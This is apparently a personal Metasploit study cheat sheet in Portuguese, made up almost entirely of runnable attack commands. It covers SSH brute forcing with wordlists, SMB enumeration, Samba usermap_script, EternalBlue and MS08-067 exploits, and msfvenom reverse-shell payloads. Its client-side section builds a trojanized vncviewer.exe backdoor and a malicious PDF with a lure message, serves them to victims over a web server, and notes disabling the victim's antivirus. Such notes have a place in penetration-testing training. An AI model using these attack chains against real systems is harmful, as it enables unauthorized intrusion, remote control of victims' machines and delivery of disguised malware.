EXPLORAÇÃO - METASPLOIT 
========================================================================================================

Documentação oficial:
Navegar e estudar todos os modulos e referencias no guia

-   `https://www.offensive-security.com/metasploit-unleashed/`


Modulos auxiliares

-   `search -h  (mostra todos os modulos, cve, porta,tipo)`
-   `search type:auxiliary ssh (nome do serviço)`
-   `info auxiliary/scanner/ssh/ssh_login (vai descrever infos do serviço)`


msf5> db_nmap -v --open -sV -Pn ip.alvo
-   `services (lista os serviços abertos do host)`

Importar Nmap para o Metasploit
-   `nmap -v --open -sV -Pn ip.alvo -oX /opt/hostsnmap.xml`
-   `db_import /opt/hostsnmap.xml`
-   `services (depois de importado mostra o resultado do scan)`
-   `vulns (vai identificar se o host ou os hosts do import tem vulnerabilidades)`


Brute Force SSH (modo auxiliar)
-   `search type:auxiliary ssh`
-   `use auxiliary/scanner/ssh/ssh/_login` 
    (criar ou utilizar wordlist para usuario e senha)`
-   `set RHOSTS ip.atacante`
-   `set THREADS 10`
-   `set USER_FILE /root/users.txt`
-   `set PASS_FILE /root/rockyou.txt`
-   `set VERBOSE true `
-   `run`
-   `sessions -i 1 (caso seja criada uma sessão com sucesso, acessar a mesma)`


Levantando INFOs
   msf5> db_nmap -p 139,445 --open -Pn -sS ip.alvo/24 (usa o modulo do nmap para scan)
-  `services (-p 139 ou -p 445)`
-  `hosts (mostra todos hosts no range)`
-  `services -p 445 --rhosts  (vai adicionar todos hosts nesse 'arquivo')`
-  `use auxiliary/scanner/smb/smb_version > services -p 445 --rhosts` 
-  `show options` 
-  `run (vai identificar SOs versão dominio etc)`
-  `hosts (para enumerar)`
-  `vulns (ver se tem vulns nos hosts)`



Identificando Vulnerabilidades
 *depois de verificar as vulns dos hosts, procurar versao especifica no meta
-   `search type:exploit fullname:"Samba 3.0.20"`
-   `search type:auxiliary smb`  
-   `db_nmap --open -p 445 ip.alvo --script=vuln -Pn  (varre todas vulns do host)`



Explorando Vuln no Linux
-   `search type:exploit fullname:"Samba 3.0.20"`
-   `use exploit/multi/samba/usermap_script`
-   `set RHOSTS 172.16.1.5  (o host com a vuln especifica)`
-   `info (veriicar os requisitos) (ele ja seta o melhor payload nesse caso)`
-   `check (verifica se o alvo é vulneravel)`
-   `exploit` 
-   `ifconfig  id   etc...`
      (pode ser trocado  porta para carregar o payload)`


Explorando Vuln no Windows
  *é explorado a ms17-010
-   `use exploit/windows/smb/ms17_010_eternalblue_win8`
    *instalar os pacotes impacket` 
-   `apt install impacket-scripts python-impacket python3-impacket`
-   `options (faz as configs padroes)`
-   `set payload windows/x64/meterpreter/reverse_tcp`  
-   `check (verifica se o alvo é vulneravel)`
-   `exploit  (sobe o meterpreter)`


Tipos de Payload 
-   windows/x64/meterpreter/reverse_tcp (sistema,arquitetura,meterpreter de conexao reversa 'alvo se conecta a sua maq)
-   windows/shell_bind_tcp (alvo abre a porta para vc se conectar)
-   windows/adduser (apenas cria user)
-   linux/x86/adduser 
-   linux/x86/shell/reverse_tcp (mesma ideia do windows)
-   (tipos staged x Inline  diferença inline vai carregado o payload inteiro e staged por estagios)
-   windows/x64/meterpreter_reverse_tcp - Inline /non_staged
-   windows/x64/meterpreter/reverse_tcp - Staged


AUTOMATIZANDO A EXPLORAÇÃO 
-   `msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST ip.alvo; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ip.atacante; run"`


==========================Exploração Client-side==========================

-   `search fileformat (mostra os exploits de software e serviços)`


Payload Simples
-   `msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip.atacante lport=444 -f exe > shellteste.exe`
-   `service apache2 start  (starta o server para a vitima baixar o exe)`
-   `cp shellteste.exe /var/www/html` 
-   
msfconsole
-   `use multi/handler` 
-   `set payload windows/meterpreter/reverse_tcp`
-   `set lport ip.atacante` 
-   `set lport 444` 
-   `exploit (aguardar a conexao reversa)`



Criando backdoor/trojan para envio (rede local)

sera enviado um arquivo para a vitima, compilado com um programa real (vncviewer.exe | teamviewer.exe ...etc)
-   `msfvenom -p windows/meterpreter/reverse_tcp lhost=MEUIP lport=1234 -x vncviewer.exe -k -f exe > vncviewer2.exe`
  *ficar ouvindo na porta especifica em outro terminal
-   `use multi/handler`
-   `set payload windows/meterpreter/reverse_tcp`
-   `set lhost MEUIP`
-   `set lport 7777`
-   `exploit (pra ouvir a conexao reversa)`

 criar server local
-   `cp vncviewer2.exe /var/www/html`


Criando PDF malicioso 
*criar um adobe_pdf_embedded_exe para envio e conseguir a shell`
-   `use exploit/windows/fileformat/adobe_pdf_embedded_exe` 
-   `set payload windows/meterpreter/reverse_tcp`
-   `set INFILENAME /usr/share/algumpdf.pdf` 
-   `set LAUNCH_MESSAGE favor abrir o arquivo para visualização`
-   `set LHOST MEUIP`
-   `set LPORT 7777`
-   `exploit` 

-   `cp algumpdf.pdf  /var/www/html/usuario.pdf`
-   `use multi/handler`
-   `set payload windows/meterpreter/reverse_tcp`
-   `set lhost MEUIP`
-   `set lport 7777` 
-   `exploit (pra ouvir a conexao reversa)`



Payloads Executaveis 
 *payload gerado e o alvo baixaria e executaria ele, enquanto meta fica escutando a conexao reversa
-   `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport=443 -f exe -o shellfelipe.exe`
-   `subir um httpserver para o alvo baixar`
-   `python -m SimpleHTTPServer 80`   
-   `Metasploit deixar o multi handler ouvindo a conexao`
-   `use exploit/multi/handler` 
-   `set payload windows/x64/meterpreter/reverse_tcp`  
-   `options (completar o lhost e lport)`
-   `exploit -j (job criado em background em escuta)`
-   `jobs (mostra os jobs criados)`
   *no alvo acessar ip do atancante via web, baixar e executar shellfelipe.exe 'desativar o AV'
   *voltar pro meta e acessar a sessao aberta 
-   `sessions -i 2`  
-   `sysinfo  (ownado)`
-   `help (todas funções)`
*a geração de payload pode ser modificada 'extensão' para funcionar de acordo com cenario,java,php etc...
 ex: -msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.16 lport=443 -f raw > shellfelipe.php



